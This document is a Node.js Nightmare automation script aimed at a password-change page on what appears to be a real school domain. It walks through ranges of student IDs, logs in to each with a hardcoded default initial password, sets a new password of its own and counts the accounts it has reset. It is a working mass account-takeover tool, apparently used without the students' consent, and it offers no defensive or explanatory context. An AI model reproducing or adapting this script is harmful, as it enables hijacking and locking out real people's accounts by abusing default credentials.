const Nightmare = require("nightmare");
const _ = require("lodash");

const nightmare = Nightmare();

const passchanger = (id) => {
  return new Promise((resolve, reject) => {
    nightmare
      .goto("https://kvispwchange.pttgrp.com/Default.aspx")
      .insert("input#KVIS\\\\Username")
      .insert("input#KVIS\\\\Username", id)
      .insert("input[id='KVIS\\\\Old Password']")
      .insert("input[id='KVIS\\\\Old Password']", "1n1t1al0!")
      .insert("input[id='KVIS\\\\New Password']")
      .insert("input[id='KVIS\\\\New Password']", "Sup3rSecur3$")
      .insert("input[id='KVIS\\\\Confirm Password']")
      .insert("input[id='KVIS\\\\Confirm Password']", "Sup3rSecur3$")
      .click("input#ChangePasswordButton")
      .wait(1500)
      .evaluate(() => document.querySelectorAll("td")[11].innerHTML)
      .then((any) => {
        resolve(`${id} : ${any}`);
      })
      .catch((e) => {
        resolve(`${id} : nightmare err, ${e}`);
      });
  });
};

const change = async () => {
  let batch4 = _.range(6100214, 6100286);
  let batch5 = _.range(6200286, 6200358);
  let batch6 = _.range(6300358, 6300431);

  let teachers = []; // teacher ids
  let students = [...batch4, ...batch5, ...batch6];

  var counter = 0;

  for (let student of students) {
    let result = await passchanger(student);
    console.log(result);
    if (result.slice(10) === "Password changed.") counter++;
  }

  console.log(`total of ${counter} is resetted`);
};

change();
